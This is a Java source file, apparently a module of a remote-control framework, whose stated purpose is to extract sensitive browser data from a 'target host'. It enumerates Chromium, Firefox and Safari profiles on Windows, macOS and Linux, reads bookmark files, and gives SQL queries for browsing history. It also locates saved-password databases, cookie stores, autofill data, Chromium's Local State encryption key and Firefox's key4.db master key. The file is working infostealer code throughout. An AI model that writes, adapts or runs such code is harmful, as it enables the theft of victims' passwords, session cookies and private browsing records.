package org.leo.core.puppet.service;

import org.leo.core.net.Communication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 浏览器数据提取服务
 * <p>
 * 内联枚举目标主机上所有浏览器的 profile 目录，提取书签、历史记录、
 * 已保存密码数据库路径和 Cookie 数据库路径等敏感信息。
 * <p>
 * 支持的浏览器：
 * - Chromium 系：Chrome, Edge, Brave, Opera, Vivaldi, Arc, Chromium, Yandex, 360
 * - Firefox 系：Firefox（动态枚举所有 profile 目录）
 * - Safari（macOS only）
 */
public class BrowserDataService extends ComponentService {

    private static final int OS_WINDOWS = 0;
    private static final int OS_MACOS   = 1;
    private static final int OS_LINUX   = 2;

    public BrowserDataService(Communication communication,
                              List<RequestLayer> requestLayers,
                              List<ResponseLayer> responseLayers) {
        super(communication, requestLayers, responseLayers);
    }

    // ==================== public API ====================

    public Map<String, Object> scanProfiles() throws Exception {
        int      osType      = detectOS();
        String   homeDir     = getHomeDir();
        List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);

        Map<String, Object> data = new HashMap<String, Object>();
        data.put("os",       osName(osType));
        data.put("profiles", buildProfileSummary(allProfiles));
        data.put("total",    allProfiles.size());

        Map<String, Object> result = new HashMap<String, Object>();
        result.put("code", 200);
        result.put("data", data);
        return result;
    }

    public Map<String, Object> extractBookmarks() throws Exception {
        int      osType      = detectOS();
        String   homeDir     = getHomeDir();
        List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);

        Map<String, Object> data = new HashMap<String, Object>();
        data.put("os",        osName(osType));
        data.put("bookmarks", doExtractBookmarks(allProfiles, osType));

        Map<String, Object> result = new HashMap<String, Object>();
        result.put("code", 200);
        result.put("data", data);
        return result;
    }

    public Map<String, Object> extractHistory(int limit) throws Exception {
        int      osType      = detectOS();
        String   homeDir     = getHomeDir();
        List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);

        Map<String, Object> data = new HashMap<String, Object>();
        data.put("os",      osName(osType));
        data.put("history", doExtractHistory(allProfiles, limit));

        Map<String, Object> result = new HashMap<String, Object>();
        result.put("code", 200);
        result.put("data", data);
        return result;
    }

    public Map<String, Object> listSensitiveFiles() throws Exception {
        int      osType      = detectOS();
        String   homeDir     = getHomeDir();
        List<Map<String, Object>> allProfiles = discoverAllProfiles(osType, homeDir);

        Map<String, Object> data = new HashMap<String, Object>();
        data.put("os", osName(osType));
        List<Map<String, Object>> sensitiveFiles = doListSensitiveFiles(allProfiles, osType, homeDir);
        data.put("sensitiveFiles", sensitiveFiles);
        data.put("total",          sensitiveFiles.size());

        Map<String, Object> result = new HashMap<String, Object>();
        result.put("code", 200);
        result.put("data", data);
        return result;
    }

    // ==================== OS detection ====================

    private int detectOS() throws Exception {
        String out = execFast("uname -s 2>/dev/null || echo Windows").trim();
        if (out.startsWith("Windows") || out.isEmpty()) return OS_WINDOWS;
        if ("Darwin".equals(out)) return OS_MACOS;
        return OS_LINUX;
    }

    private String osName(int osType) {
        if (osType == OS_WINDOWS) return "windows";
        if (osType == OS_MACOS)   return "macos";
        return "linux";
    }

    private String getHomeDir() throws Exception {
        return execFast("echo $HOME 2>/dev/null").trim();
    }

    // ==================== profile discovery ====================

    /**
     * 发现所有浏览器 profile 目录.
     * 每个元素: {browser, path, type: "chromium"|"firefox"|"safari", profileName?}
     */
    private List<Map<String, Object>> discoverAllProfiles(int osType, String homeDir) throws Exception {
        List<Map<String, Object>> profiles = new ArrayList<Map<String, Object>>();

        // ── Chromium 系 ──
        String[][] chromiumDefs = getChromiumBrowserDefs(homeDir, osType);
        for (int b = 0; b < chromiumDefs.length; b++) {
            String browserName  = chromiumDefs[b][0];
            String userDataDir  = chromiumDefs[b][1];
            discoverChromiumProfiles(profiles, browserName, userDataDir, osType);
        }

        // ── Firefox 系 ──
        String[] ffParentDirs = getFirefoxParentDirs(homeDir, osType);
        for (int i = 0; i < ffParentDirs.length; i++) {
            discoverFirefoxProfiles(profiles, ffParentDirs[i], osType);
        }

        // ── Safari (macOS only) ──
        if (osType == OS_MACOS) {
            String safariPath = homeDir + "/Library/Safari";
            if (fileExists(safariPath, false, osType)) {
                Map<String, Object> p = new HashMap<String, Object>();
                p.put("browser", "safari");
                p.put("path",    safariPath);
                p.put("type",    "safari");
                profiles.add(p);
            }
        }

        return profiles;
    }

    private void discoverChromiumProfiles(List<Map<String, Object>> profiles,
                                          String browserName, String userDataDir,
                                          int osType) throws Exception {
        String listing = lsDir(userDataDir, osType);
        if (listing == null || listing.trim().isEmpty()) return;

        String sep = osType == OS_WINDOWS ? "\\" : "/";
        String[] entries = listing.trim().split("\n");
        for (int i = 0; i < entries.length; i++) {
            String name = entries[i].trim();
            if (name.isEmpty()) continue;
            // Chromium profile dirs: "Default", "Profile N", "Guest Profile"
            if (!"Default".equals(name) && !name.startsWith("Profile ") && !"Guest Profile".equals(name)) {
                continue;
            }
            String profilePath = userDataDir + sep + name;
            // confirm it's a real profile dir
            if (!fileExists(profilePath + sep + "Preferences", true, osType)
                    && !fileExists(profilePath + sep + "History", true, osType)
                    && !fileExists(profilePath + sep + "Bookmarks", true, osType)) {
                continue;
            }
            Map<String, Object> p = new HashMap<String, Object>();
            p.put("browser",     browserName);
            p.put("path",        profilePath);
            p.put("type",        "chromium");
            p.put("profileName", name);
            profiles.add(p);
        }
    }

    private void discoverFirefoxProfiles(List<Map<String, Object>> profiles,
                                         String parentDir, int osType) throws Exception {
        String listing = lsDir(parentDir, osType);
        if (listing == null || listing.trim().isEmpty()) return;

        String sep     = osType == OS_WINDOWS ? "\\" : "/";
        String[] entries = listing.trim().split("\n");
        for (int i = 0; i < entries.length; i++) {
            String name = entries[i].trim();
            if (name.isEmpty()) continue;
            String profilePath = parentDir + sep + name;
            if (!fileExists(profilePath + sep + "prefs.js", true, osType)
                    && !fileExists(profilePath + sep + "places.sqlite", true, osType)) {
                continue;
            }
            Map<String, Object> p = new HashMap<String, Object>();
            p.put("browser",     "firefox");
            p.put("path",        profilePath);
            p.put("type",        "firefox");
            p.put("profileName", name);
            profiles.add(p);
        }
    }

    // ==================== browser path definitions ====================

    private String[][] getChromiumBrowserDefs(String home, int osType) {
        if (osType == OS_WINDOWS) {
            return new String[][]{
                {"chrome",   home + "\\AppData\\Local\\Google\\Chrome\\User Data"},
                {"edge",     home + "\\AppData\\Local\\Microsoft\\Edge\\User Data"},
                {"brave",    home + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"},
                {"opera",    home + "\\AppData\\Roaming\\Opera Software\\Opera Stable"},
                {"opera-gx", home + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable"},
                {"vivaldi",  home + "\\AppData\\Local\\Vivaldi\\User Data"},
                {"yandex",   home + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data"},
                {"chromium", home + "\\AppData\\Local\\Chromium\\User Data"},
                {"360",      home + "\\AppData\\Local\\360Chrome\\Chrome\\User Data"},
            };
        }
        if (osType == OS_MACOS) {
            return new String[][]{
                {"chrome",   home + "/Library/Application Support/Google/Chrome"},
                {"edge",     home + "/Library/Application Support/Microsoft Edge"},
                {"brave",    home + "/Library/Application Support/BraveSoftware/Brave-Browser"},
                {"opera",    home + "/Library/Application Support/com.operasoftware.Opera"},
                {"opera-gx", home + "/Library/Application Support/com.operasoftware.OperaGX"},
                {"vivaldi",  home + "/Library/Application Support/Vivaldi"},
                {"arc",      home + "/Library/Application Support/Arc/User Data"},
                {"chromium", home + "/Library/Application Support/Chromium"},
            };
        }
        // Linux
        return new String[][]{
            {"chrome",   home + "/.config/google-chrome"},
            {"edge",     home + "/.config/microsoft-edge"},
            {"brave",    home + "/.config/BraveSoftware/Brave-Browser"},
            {"opera",    home + "/.config/opera"},
            {"vivaldi",  home + "/.config/vivaldi"},
            {"chromium", home + "/.config/chromium"},
            {"yandex",   home + "/.config/yandex-browser"},
        };
    }

    private String[] getFirefoxParentDirs(String home, int osType) {
        if (osType == OS_WINDOWS) {
            return new String[]{home + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"};
        }
        if (osType == OS_MACOS) {
            return new String[]{home + "/Library/Application Support/Firefox/Profiles"};
        }
        return new String[]{home + "/.mozilla/firefox"};
    }

    // ==================== op=0: profile summary ====================

    private List<Map<String, Object>> buildProfileSummary(List<Map<String, Object>> allProfiles) {
        List<Map<String, Object>> result = new ArrayList<Map<String, Object>>();
        for (int i = 0; i < allProfiles.size(); i++) {
            Map<String, Object> src = allProfiles.get(i);
            Map<String, Object> p   = new HashMap<String, Object>();
            p.put("browser", src.get("browser"));
            p.put("path",    src.get("path"));
            p.put("exists",  Boolean.TRUE);
            if (src.get("profileName") != null) p.put("profileName", src.get("profileName"));
            result.add(p);
        }
        return result;
    }

    // ==================== op=1: bookmarks ====================

    private List<Map<String, Object>> doExtractBookmarks(List<Map<String, Object>> allProfiles,
                                                          int osType) throws Exception {
        List<Map<String, Object>> bookmarks = new ArrayList<Map<String, Object>>();
        String sep = osType == OS_WINDOWS ? "\\" : "/";

        for (int i = 0; i < allProfiles.size(); i++) {
            Map<String, Object> prof    = allProfiles.get(i);
            String              browser = (String) prof.get("browser");
            String              path    = (String) prof.get("path");
            String              type    = (String) prof.get("type");

            if ("chromium".equals(type)) {
                String bmPath = path + sep + "Bookmarks";
                if (fileExists(bmPath, true, osType)) {
                    Map<String, Object> entry = new HashMap<String, Object>();
                    entry.put("browser", browser);
                    entry.put("path",    bmPath);
                    String content = catFile(bmPath, osType);
                    entry.put("content", truncate(content, 32768));
                    bookmarks.add(entry);
                }
            } else if ("firefox".equals(type)) {
                String placesDb = path + sep + "places.sqlite";
                if (fileExists(placesDb, true, osType)) {
                    Map<String, Object> entry = new HashMap<String, Object>();
                    entry.put("browser", browser);
                    entry.put("path",    placesDb);
                    entry.put("note",    "SQLite database — query moz_bookmarks + moz_places");
                    bookmarks.add(entry);
                }
            } else if ("safari".equals(type)) {
                String safariBookmarks = path + sep + "Bookmarks.plist";
                if (fileExists(safariBookmarks, true, osType)) {
                    Map<String, Object> entry = new HashMap<String, Object>();
                    entry.put("browser", "safari");
                    entry.put("path",    safariBookmarks);
                    String xmlContent = execFast("plutil -convert xml1 -o - '" + safariBookmarks + "' 2>/dev/null");
                    if (xmlContent != null && !xmlContent.isEmpty()) {
                        entry.put("content", truncate(xmlContent, 32768));
                    } else {
                        entry.put("note", "Binary plist — use: plutil -convert xml1 -o - Bookmarks.plist");
                    }
                    bookmarks.add(entry);
                }
            }
        }
        return bookmarks;
    }

    // ==================== op=2: history ====================

    private List<Map<String, Object>> doExtractHistory(List<Map<String, Object>> allProfiles,
                                                        int limit) {
        List<Map<String, Object>> historyList = new ArrayList<Map<String, Object>>();
        String sep = "/";  // will be overridden per path — paths already use correct separator

        for (int i = 0; i < allProfiles.size(); i++) {
            Map<String, Object> prof    = allProfiles.get(i);
            String              browser = (String) prof.get("browser");
            String              path    = (String) prof.get("path");
            String              type    = (String) prof.get("type");
            // Detect separator from path
            boolean isWin = path.contains("\\");
            String s = isWin ? "\\" : "/";

            if ("chromium".equals(type)) {
                String histPath = path + s + "History";
                Map<String, Object> entry = new HashMap<String, Object>();
                entry.put("browser", browser);
                entry.put("path",    histPath);
                entry.put("note",    "SQLite DB — SELECT url, title, visit_count, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT " + limit);
                historyList.add(entry);
            } else if ("firefox".equals(type)) {
                String placesDb = path + s + "places.sqlite";
                Map<String, Object> entry = new HashMap<String, Object>();
                entry.put("browser", browser);
                entry.put("path",    placesDb);
                entry.put("note",    "SQLite DB — SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT " + limit);
                historyList.add(entry);
            } else if ("safari".equals(type)) {
                String histDb = path + s + "History.db";
                Map<String, Object> entry = new HashMap<String, Object>();
                entry.put("browser", "safari");
                entry.put("path",    histDb);
                entry.put("note",    "SQLite DB — SELECT hi.url, hv.title, hi.visit_count FROM history_items hi LEFT JOIN history_visits hv ON hi.id = hv.history_item ORDER BY hv.visit_time DESC LIMIT " + limit);
                historyList.add(entry);
            }
        }
        return historyList;
    }

    // ==================== op=3: sensitive files ====================

    private List<Map<String, Object>> doListSensitiveFiles(List<Map<String, Object>> allProfiles,
                                                            int osType,
                                                            String homeDir) throws Exception {
        List<Map<String, Object>> sensitiveFiles = new ArrayList<Map<String, Object>>();

        for (int i = 0; i < allProfiles.size(); i++) {
            Map<String, Object> prof    = allProfiles.get(i);
            String              browser = (String) prof.get("browser");
            String              path    = (String) prof.get("path");
            String              type    = (String) prof.get("type");
            boolean             isWin   = path.contains("\\");
            String              s       = isWin ? "\\" : "/";

            if ("chromium".equals(type)) {
                checkSensitiveFile(sensitiveFiles, browser, path, s, "Login Data",  "passwords",      osType);
                checkSensitiveFile(sensitiveFiles, browser, path, s, "Cookies",     "cookies",        osType);
                checkSensitiveFile(sensitiveFiles, browser, path, s, "Web Data",    "autofill",       osType);
                checkSensitiveFile(sensitiveFiles, browser, path, s, "History",     "history",        osType);
                // Local State sits one level up in User Data dir
                String parentDir = parentPath(path, s);
                if (parentDir != null) {
                    checkSensitiveFile(sensitiveFiles, browser, parentDir, s, "Local State", "encryption_key", osType);
                }
            } else if ("firefox".equals(type)) {
                checkSensitiveFile(sensitiveFiles, browser, path, s, "logins.json",        "passwords", osType);
                checkSensitiveFile(sensitiveFiles, browser, path, s, "key4.db",            "master_key", osType);
                checkSensitiveFile(sensitiveFiles, browser, path, s, "cookies.sqlite",     "cookies",   osType);
                checkSensitiveFile(sensitiveFiles, browser, path, s, "formhistory.sqlite", "autofill",  osType);
                checkSensitiveFile(sensitiveFiles, browser, path, s, "places.sqlite",      "history",   osType);
            } else if ("safari".equals(type)) {
                checkSensitiveFile(sensitiveFiles, "safari", path, s, "History.db",     "history",   osType);
                checkSensitiveFile(sensitiveFiles, "safari", path, s, "Bookmarks.plist","bookmarks", osType);
                checkSensitiveFile(sensitiveFiles, "safari", path, s, "LastSession.plist","session", osType);
                checkSensitiveFile(sensitiveFiles, "safari", path, s, "TopSites.plist", "history",  osType);
                // Cookies are in a separate sandbox dir on macOS
                String cookieDir = homeDir + "/Library/Cookies";
                checkSensitiveFile(sensitiveFiles, "safari", cookieDir, s, "Cookies.binarycookies", "cookies", osType);
            }
        }
        return sensitiveFiles;
    }

    private void checkSensitiveFile(List<Map<String, Object>> list,
                                    String browser, String basePath, String sep,
                                    String fileName, String category,
                                    int osType) throws Exception {
        String fullPath = basePath + sep + fileName;
        if (!fileExists(fullPath, true, osType)) return;

        Map<String, Object> entry = new HashMap<String, Object>();
        entry.put("browser",  browser);
        entry.put("path",     fullPath);
        entry.put("fileName", fileName);
        entry.put("category", category);

        // Get file size and readable flag
        long size     = getFileSize(fullPath, osType);
        boolean readable = isFileReadable(fullPath, osType);
        if (size >= 0) entry.put("sizeBytes", size);
        entry.put("readable", readable);
        list.add(entry);
    }

    // ==================== shell file-system helpers ====================

    /** List directory contents, one entry per line. Returns null if dir doesn't exist. */
    private String lsDir(String dirPath, int osType) throws Exception {
        if (osType == OS_WINDOWS) {
            return execFast(winCmd("dir /b \"" + dirPath + "\" 2>nul"));
        }
        return execFast("ls -1 \"" + dirPath + "\" 2>/dev/null");
    }

    /** Check file/dir existence. isFile=true → -f, isFile=false → -d (for Unix). Windows uses 'if exist'. */
    private boolean fileExists(String path, boolean isFile, int osType) throws Exception {
        if (osType == OS_WINDOWS) {
            String out = execFast(winCmd("if exist \"" + path + "\" echo 1")).trim();
            return "1".equals(out);
        }
        String flag = isFile ? "-f" : "-d";
        String out  = execFast("test " + flag + " \"" + path + "\" 2>/dev/null && echo 1 || echo 0").trim();
        return "1".equals(out);
    }

    /** Read a text file, up to 32768 chars. */
    private String catFile(String path, int osType) throws Exception {
        if (osType == OS_WINDOWS) {
            return execFast(winCmd("type \"" + path + "\" 2>nul"));
        }
        return execFast("cat \"" + path + "\" 2>/dev/null");
    }

    /** Get file size in bytes; returns -1 on error. */
    private long getFileSize(String path, int osType) throws Exception {
        String out;
        if (osType == OS_WINDOWS) {
            // for %~z is batch-only; use wmic or a workaround
            out = execFast(winCmd("for %F in (\"" + path + "\") do @echo %~zF")).trim();
        } else if (osType == OS_MACOS) {
            out = execFast("stat -f%z \"" + path + "\" 2>/dev/null").trim();
        } else {
            out = execFast("stat -c%s \"" + path + "\" 2>/dev/null").trim();
        }
        try { return Long.parseLong(out); } catch (NumberFormatException e) { return -1L; }
    }

    /** Check if file is readable by current user. */
    private boolean isFileReadable(String path, int osType) throws Exception {
        if (osType == OS_WINDOWS) {
            // Try opening the file; if no error it's readable
            String out = execFast(winCmd("type \"" + path + "\" >nul 2>&1 && echo 1 || echo 0")).trim();
            return "1".equals(out);
        }
        String out = execFast("test -r \"" + path + "\" 2>/dev/null && echo 1 || echo 0").trim();
        return "1".equals(out);
    }

    /** Get parent directory path. */
    private String parentPath(String path, String sep) {
        if (path == null || path.isEmpty()) return null;
        int idx = path.lastIndexOf(sep);
        if (idx <= 0) return null;
        return path.substring(0, idx);
    }

    // ==================== helpers ====================

    private String truncate(String s, int maxLen) {
        if (s == null) return null;
        if (s.length() <= maxLen) return s;
        return s.substring(0, maxLen) + "\n... (truncated, total " + s.length() + " chars)";
    }
}
